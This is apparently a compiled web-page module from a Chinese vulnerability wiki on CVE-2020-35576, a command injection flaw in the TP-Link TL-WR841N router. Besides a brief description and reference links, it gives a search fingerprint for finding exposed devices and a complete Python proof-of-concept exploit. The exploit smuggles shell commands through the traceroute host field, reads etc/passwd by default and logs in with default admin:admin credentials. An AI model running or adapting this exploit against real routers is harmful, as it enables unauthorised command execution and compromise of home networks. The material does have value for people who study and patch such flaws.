import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as i,a as n,b as s,d as t,e as c}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"通过该漏洞，经过身份验证的攻击者可以在TP-Link TL-WR841N系统上执行任意命令。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://isopach.dev/CVE-2020-35576/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-35576",target:"_blank",rel:"noopener noreferrer"},m=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TP-Link TL-WR841N
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;TP_LINK-TL-WR841N&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Author: Koh You Liang (Isopach)</span>
<span class="token comment"># Exploit Title: TP-Link TL-WR841N OS Command Injection Exploit</span>
<span class="token comment"># Date: 2020-12-13</span>
<span class="token comment"># Vendor Homepage: https://www.tp-link.com/</span>
<span class="token comment"># Software Link: https://www.tp-link.com/jp/support/download/tl-wr841n/v13/#Firmware</span>
<span class="token comment"># Version: TL-WR841N 0.9.1 4.0</span>
<span class="token comment"># Tested on: Windows 10, macOS Mojave, Ubuntu 20.04.1 LTS</span>
<span class="token comment"># CVE: CVE-2020-35576</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time

<span class="token keyword">try</span><span class="token punctuation">:</span>
    _ <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    payload <span class="token operator">=</span> <span class="token string">&#39; &#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] Command not specified, using the default \`cat etc/passwd\`&quot;</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">&#39;cat etc/passwd&#39;</span>

<span class="token comment"># Default credentials is admin:admin - replace with your own</span>
cookies <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Authorization&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Basic YWRtaW46YWRtaW4=&#39;</span>
<span class="token punctuation">}</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Host&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;192.168.0.1&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;en-US,en;q=0.5&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;gzip, deflate&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/plain&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Content-Length&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;197&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Origin&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;http://192.168.0.1&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Connection&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;close&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;http://192.168.0.1/mainFrame.htm&#39;</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

data1 <span class="token operator">=</span> \\
<span class="token triple-quoted-string string">&#39;&#39;&#39;[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\r\\nmaxHopCount=20\\r\\ntimeout=50\\r\\nnumberOfTries=1\\r\\nhost=&quot;\`{}\`&quot;\\r\\ndataBlockSize=64\\r\\nX_TP_ConnName=ewan_ipoe_d\\r\\ndiagnosticsState=Requested\\r\\nX_TP_HopSeq=0\\r\\n&#39;&#39;&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
response1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.0.1/cgi?2&#39;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Sending payload...&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    response1<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">&#39;[-] Cannot get response. Please check your cookie.&#39;</span><span class="token punctuation">)</span>
    
<span class="token keyword">if</span> response1<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;[error]0&#39;</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">&#39;[*] Router/Firmware is not vulnerable.&#39;</span><span class="token punctuation">)</span>

data2 <span class="token operator">=</span> <span class="token string">&#39;[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\r\\n&#39;</span>
response2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.0.1/cgi?7&#39;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Receiving response from router...&#39;</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.8</span><span class="token punctuation">)</span> <span class="token comment"># Buffer time for traceroute to succeed</span>

data3 <span class="token operator">=</span> <span class="token triple-quoted-string string">&#39;&#39;&#39;[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\ndiagnosticsState\\r\\nX_TP_HopSeq\\r\\nX_TP_Result\\r\\n&#39;&#39;&#39;</span>
response3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.0.1/cgi?1&#39;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data3<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> <span class="token string">&#39;=:&#39;</span> <span class="token keyword">in</span> response3<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Command not supported.&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Exploit successful!&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line_number<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>response3<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> line_number <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> line_number <span class="token operator">&gt;</span> <span class="token number">3</span> <span class="token keyword">and</span> line <span class="token operator">!=</span> <span class="token string">&#39;[error]0&#39;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">&#39;not known&#39;</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function b(g,h){const a=p("ExternalLinkIcon");return o(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://isopach.dev/CVE-2020-35576/"),t(a)])]),n("li",null,[n("a",v,[s("https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-35576"),t(a)])])]),m])}const w=e(l,[["render",b],["__file","TP-Link TL-WR841N 远程代码执行漏洞 CVE-2020-35576.html.vue"]]);export{w as default};
